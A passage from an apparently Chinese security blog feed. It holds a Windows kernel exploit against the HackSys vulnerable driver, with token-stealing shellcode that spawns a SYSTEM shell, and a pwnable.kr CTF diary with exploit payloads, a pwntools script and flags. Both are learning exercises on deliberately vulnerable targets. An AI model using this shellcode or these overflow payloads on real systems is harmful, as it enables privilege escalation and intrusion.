CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,\</span></span><br><span class="line">METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACKSYS_EVD_IOCTL_STACK_OVERFLOW CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,\</span></span><br><span class="line">METHOD_NEITHER, FILE_ANY_ACCESS)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KTHREAD_OFFSET  0x124</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EPROCESS_OFFSET 0x044</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PID_OFFSET0x084</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLINK_OFFSET0x088</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TOKEN_OFFSET0x0c8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYSTEM_PID      0x004</span></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">TokenStealingShellcodeWin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">__asm &#123;</span><br><span class="line">pushad</span><br><span class="line"></span><br><span class="line">mov eax,fs:[KTHREAD_OFFSET]</span><br><span class="line">mov eax,[eax + EPROCESS_OFFSET]</span><br><span class="line"></span><br><span class="line">mov ecx,eax</span><br><span class="line">mov ebx,[eax + TOKEN_OFFSET]</span><br><span class="line">mov edx,SYSTEM_PID</span><br><span class="line"></span><br><span class="line">SearchSystemPID:</span><br><span class="line">mov eax,[eax + FLINK_OFFSET]</span><br><span class="line">sub eax,FLINK_OFFSET</span><br><span class="line">cmp [eax+PID_OFFSET],edx</span><br><span class="line">jne SearchSystemPID</span><br><span class="line"></span><br><span class="line">mov edx,[eax + TOKEN_OFFSET]</span><br><span class="line">mov [ecx + TOKEN_OFFSET],edx</span><br><span class="line"></span><br><span class="line">popad</span><br><span class="line">        </span><br><span class="line">;recovery</span><br><span class="line"><span class="keyword">xor</span> eax,eax ;<span class="built_in">set</span> NTSTATUS SUCEESS</span><br><span class="line">add esp,<span class="number">12</span>  ;fix <span class="built_in">stack</span></span><br><span class="line">pop ebp</span><br><span class="line">ret <span class="number">8</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc,_TCHAR* argv[])&#123;</span><br><span class="line"></span><br><span class="line">DWORD lpBytesReturned;</span><br><span class="line">PVOID pMemoryAddress = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">//PULONG lpInBuffer = NULL;</span></span><br><span class="line">LPCSTR lpDeviceName = (LPCSTR) <span class="string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span>;</span><br><span class="line"><span class="comment">//SIZE_T nInBufferSize = 1024 * sizeof(ULONG);</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Getting the device handle\r\n&quot;</span>);</span><br><span class="line">HANDLE hDriver = CreateFileA(lpDeviceName,</span><br><span class="line">GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">FILE_SHARE_READ | FILE_SHARE_WRITE,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">OPEN_EXISTING,</span><br><span class="line">FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,</span><br><span class="line"><span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hDriver == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Failed to get device handle : (0x%X\r\n)&quot;</span>,GetLastError());</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Got the device Handle : 0x%X\r\n&quot;</span>, hDriver);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Allocating Memory For Input Buffer\r\n&quot;</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">lpInBuffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, nInBufferSize);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">if (!lpInBuffer) &#123;</span></span><br><span class="line"><span class="comment">printf(&quot;HeapAlloc failed :(0x%X\r\n)&quot;,GetLastError());</span></span><br><span class="line"><span class="comment">return 1;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">printf(&quot;Input buffer allocated as 0x%X bytes.\r\n&quot;,nInBufferSize);</span></span><br><span class="line"><span class="comment">printf(&quot;Input buffer address : 0x%p\r\n&quot;,lpInBuffer);</span></span><br><span class="line"><span class="comment">printf(&quot;Filling buffer with A&#x27;s\r\n&quot;);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//RtlFillMemory((PVOID)lpInBuffer, nInBufferSize, 0x41);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t[*]Payload is at : %p\n&quot;</span>, TokenStealingShellcodeWin);</span><br><span class="line"><span class="comment">//junk&#x27;s length is 2080</span></span><br><span class="line">CHAR *chBuffer = (CHAR*)<span class="built_in">malloc</span>(<span class="number">2084</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t[*]Buffer is at : %p\n&quot;</span>, &amp;chBuffer);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(chBuffer, <span class="number">0x41</span>, <span class="number">2048</span>);</span><br><span class="line"><span class="built_in">memset</span>(chBuffer + <span class="number">2048</span>, <span class="number">0x42</span>, <span class="number">32</span>);</span><br><span class="line">    <span class="comment">//set eip</span></span><br><span class="line">chBuffer[<span class="number">2080</span>] = (DWORD)&amp;TokenStealingShellcodeWin &amp; <span class="number">0x000000FF</span>;</span><br><span class="line">chBuffer[<span class="number">2080</span> + <span class="number">1</span>] = ((DWORD)&amp;TokenStealingShellcodeWin &amp; <span class="number">0x0000FF00</span>) &gt;&gt;<span class="number">8</span>;</span><br><span class="line">chBuffer[<span class="number">2080</span> + <span class="number">2</span>] = ((DWORD)&amp;TokenStealingShellcodeWin &amp; <span class="number">0x00FF0000</span>) &gt;&gt; <span class="number">16</span>;</span><br><span class="line">chBuffer[<span class="number">2080</span> + <span class="number">3</span>] = ((DWORD)&amp;TokenStealingShellcodeWin &amp; <span class="number">0xFF000000</span>) &gt;&gt; <span class="number">24</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Send IOCTL request\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">DeviceIoControl(hDriver,</span><br><span class="line">HACKSYS_EVD_IOCTL_STACK_OVERFLOW,</span><br><span class="line">chBuffer,</span><br><span class="line"><span class="number">2084</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">&amp;lpBytesReturned,</span><br><span class="line"><span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;cmd.exe&quot;</span>); <span class="comment">//get shell</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;IOCTL request completed,cleaning up da heap.\r\n&quot;</span>);</span><br><span class="line"><span class="comment">//HeapFree(GetProcessHeap(), 0, (LPVOID)lpInBuffer);</span></span><br><span class="line">CloseHandle(hDriver);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>重新编译后运行exploit程序。<br>因为我这个xp在安装的时候没有装whoami工具，所以在看我使用了ProcessExplorer来看新启动的cmd的权限信息。<br>在运行exploit之前<br><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/before_exp.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/before_exp.png"></a><br>运行exploit<br><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/after_exp.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/after_exp.png"></a><br>成功拿到最高权限。</p><h4 id="0x05：关于shell-code的分析"><a href="#0x05：关于shell-code的分析" class="headerlink" title="0x05：关于shell code的分析"></a>0x05：关于shell code的分析</h4><p>想要分析shellcode是如何工作的，直接在它最前面加一个<code>int 3</code>然后重新编译，再把exploit跑起来，windbg里分析就好了。<br>前面说到这个获取token要找到EPROCESS结构。</p><p><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/process.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/process.png"></a></p><p>然而windows有个API <code>PsGetCurrentProcess</code>可以获取包含EPROCESS结构的process对象。<br>反汇编看下这个API的实现：<br><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/getprocess.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/getprocess.png"></a></p><p>使用<code>dt -b -v _EPROCESS</code>查看<code>EPROCESS</code>结构。<br><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/EPROCESS.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/EPROCESS.png"></a><br>之前在shellcode中看到的一些数据的定义，都可以在这里找到。<br>下面来分析我们这段shellcode的工作。<br><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/shellcode.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/shellcode.png"></a><br>单步<br><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/shellcode1.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/shellcode1.png"></a><br>至此，获得当前进程的EPROCESS结构指针保存在ecx待用。<br>下面进入循环寻找SYSTEM_PID,然后获取其token：<br><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/shellcode2.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/shellcode2.png"></a><br>这个循环跑的次数挺多，我直接下断跳出循环接着分析，这里来到token替换的部分：<br><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/shellcode3.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/shellcode3.png"></a><br>之后直接popad弹出之前保存的寄存器的值，然后回到原来的代码去执行，这个时候我们的进程(demo_bof)的token已经是system进程的token了，这个时候直接起一个cmd，就可以得到一个最高权限的shell了。<br><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/back.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/back.png"></a><br>这个时候F5，虚拟机那边就已经起来一个system32的cmd了。<br><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/getit.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/getit.png"></a></p><h4 id="0x06-参考与引用"><a href="#0x06-参考与引用" class="headerlink" title="0x06: 参考与引用"></a>0x06: 参考与引用</h4><p><a href="http://www.hacking-training.com/download/WKE.pdf">Windows Kernel Exploit</a><br>lhs0k师傅的帮助</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> kernel </tag>
            
            <tag> exploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable刷题日记 第一阶梯部分</title>
      <link href="pwnable%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0.html"/>
      <url>pwnable%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="Pwnable"><a href="#Pwnable" class="headerlink" title="Pwnable"></a>Pwnable</h1><p>这是一个棒子弄的CTF题库，主要针对的是pwn的这个么一个题型，网站的地址是 <a href="http://pwnable.kr/">http://pwnable.kr/</a>。与之相对的还有一个逆向的题库，也是棒子出的，这里也顺便提一下。<br>总体大概能分为四个层次吧，第一个层次题目也比较多，但是也比较基础。</p><h1 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h1><p><strong>时间</strong> 2017-01-17  感觉某些事情很不顺心，所以刷题来了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;pass argv[1] a number\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">&quot;LETMEWIN\n&quot;</span>, buf))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;good job :)\n&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;learn about Linux file IO\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前面的几个题好像都给了源代码，这是第一个题的源代码。<br>需要说明的是，**atoi **这个函数是将字符串转换成整型数的一个函数，而0x1234的整型是4660<br>从代码来看，<br>目标：执行system(“/bin/cat flag”);<br>则：strcmp(“LETMEWIN\n”, buf) == 0<br>则：buf = “LETMEWIN\n”<br>则：read(fd, buf, 32)将buf设为”LETMEWIN\n”<br>fd == 0为标准输入<br>fd == 1为标准输出<br>fd == 2为标准错误输出<br>而0x1234 = 4660 所以我们只需要输入为 4660，我们可以使fd == 0，然后从终端输入LETMEWIN后回车 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./fd 4660</span><br><span class="line">LETMEWIN</span><br><span class="line"></span><br><span class="line">good job :)</span><br><span class="line">flag:  mommy! I think I know what a file descriptor is!!</span><br></pre></td></tr></table></figure><h1 id="col"><a href="#col" class="headerlink" title="col"></a>col</h1><p>源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">res += ip[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;usage : %s [passcode]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;passcode length should be 20 bytes\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;wrong passcode.\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入20字节，每4字节作为一个整数，相加后得到 0x21DD09EC即可。由于是通过strlen判断长度，所以不能有0x00出现，将0x21DD09EC拆分成5个整数相加（0x01010101 + 0x01010101 + 0x01010101 + 0x01010101 + 0x1DD905E8）<br>所以 exp为:    </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(python -c <span class="string">&#x27;print &quot;\xE8\x05\xD9\x1D&quot; + 16*&quot;\x01&quot;&#x27;</span>)  </span><br><span class="line"> </span><br><span class="line">flag ： daddy! I just managed to create a hash collision :)</span><br></pre></td></tr></table></figure><p>为什么是<strong>xE8\x05\xD9\x1D</strong> 因为是32位，所以是小端输入。</p><h1 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h1><p><strong>时间</strong> 2017-01-19<br>这个题目给了一个bin程序以及源码，内容如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;overflow me : &quot;</span>);</span><br><span class="line">gets(overflowme);<span class="comment">// smash me!</span></span><br><span class="line"><span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Nah..\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">func(<span class="number">0xdeadbeef</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，题目的bin是32为的，主要小端。而题目思路很简单，通过溢出，去覆盖key为0xcafebabe,当key的值为0xcafebabe，他会调用system的**/bin/sh**<br> 而我们的目的是得到flag，所以我们再写入<code>cat flag</code>。那么这里主要的一个问题就是，我们如何准确的覆盖到overflowme的数组呢。<br><a href="http://oayoilchh.bkt.clouddn.com/17-1-19/693899-file_1484832203073_cb0d.png" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/17-1-19/693899-file_1484832203073_cb0d.png"></a><br>ebp为定位标准，所以0x2c+8即可 所以应该是 54个字节。所以最终的exp是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = io = remote(<span class="string">&quot;pwnable.kr&quot;</span>,<span class="number">9000</span>)</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">52</span> + <span class="string">&quot;\xbe\xba\xfe\xca&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line">result = io.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">print</span> result</span><br></pre></td></tr></table></figure><h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><p>upx解压缩，在IDA中，找到flag变量引用，<br><a href="http://oayoilchh.bkt.clouddn.com/17-1-19/99198640-file_1484837703856_14448.png" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/17-1-19/99198640-file_1484837703856_14448.png"></a></p><h1 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h1><p><strong>时间</strong>2017-01-20<br>ssh上去后，题目给了源代码，如下:`</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void login()&#123;</span><br><span class="line">        int passcode1;</span><br><span class="line">        int passcode2;</span><br><span class="line"></span><br><span class="line">        printf(&quot;enter passcode1 : &quot;);</span><br><span class="line">        scanf(&quot;%d&quot;, passcode1);</span><br><span class="line">        fflush(stdin);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span><br><span class="line">        printf(&quot;enter passcode2 : &quot;);</span><br><span class="line">        scanf(&quot;%d&quot;, passcode2);</span><br><span class="line"></span><br><span class="line">        printf(&quot;checking...\n&quot;);</span><br><span class="line">        if(passcode1&#x3D;&#x3D;338150 &amp;&amp; passcode2&#x3D;&#x3D;13371337)&#123;</span><br><span class="line">                printf(&quot;Login OK!\n&quot;);</span><br><span class="line">                system(&quot;&#x2F;bin&#x2F;cat flag&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">                printf(&quot;Login Failed!\n&quot;);</span><br><span class="line">                exit(0);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void welcome()&#123;</span><br><span class="line">        char name[100];</span><br><span class="line">        printf(&quot;enter you name : &quot;);</span><br><span class="line">        scanf(&quot;%100s&quot;, name);</span><br><span class="line">        printf(&quot;Welcome %s!\n&quot;, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">        printf(&quot;Toddler&#39;s Secure Login System 1.0 beta.\n&quot;);</span><br><span class="line"></span><br><span class="line">        welcome();</span><br><span class="line">        login();</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; something after login...</span><br><span class="line">        printf(&quot;Now I can safely trust you that you have credential :)\n&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本来第一份反应是构造去满足if的条件即可，但是发现welcome函数的数组只有100，name[100] ebp 0x70 112 pwd1 ebp-0x10 16 pwd2 ebp-0xc 12 112-12=100，不足以去覆盖未初始化的passcode2，但是我们会发现login函数里的两个scanf有洞，我们可以利用这个误用构造用过函数跳转去执行<code>/bin/cat flag</code>,那么我们需要的条件之一是如何构造以及去找到关键的这个执行的地址在哪。</p><p>我们知道，当if不符合条件的时候，他会执行exit寒素，我们将passcode1修改为exit，即 “\x18\xa0\x04\x08”<br><a href="http://oayoilchh.bkt.clouddn.com/17-1-20/71309578-file_1484924172110_a5eb.png" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/17-1-20/71309578-file_1484924172110_a5eb.png"></a><br>然后再让他去执行 system(“/bin/cat flag”);<br>我们通过 objdump -M intel -d ./passcode 去找关键的地址<br><a href="http://oayoilchh.bkt.clouddn.com/17-1-20/32318341-file_1484924207785_de63.jpg" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/17-1-20/32318341-file_1484924207785_de63.jpg"></a><br>所以最后的exp是:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c  <span class="string">&#x27;print &quot;A&quot;*96 + &quot;\x18\xa0\x04\x08&quot; + &quot;134514147\n&quot;+ &quot;f\n&quot;&#x27;</span> | ./passcode</span><br></pre></td></tr></table></figure><p>134514147为0x80485e3的十进制数值（因为 %d是取出整数）</p><h1 id="random"><a href="#random" class="headerlink" title="random"></a>random</h1><p>这个题目依旧没给bin程序，但是给了源代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> random;</span><br><span class="line">        random = rand();        <span class="comment">// random value!</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;key);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( (key ^ random) == <span 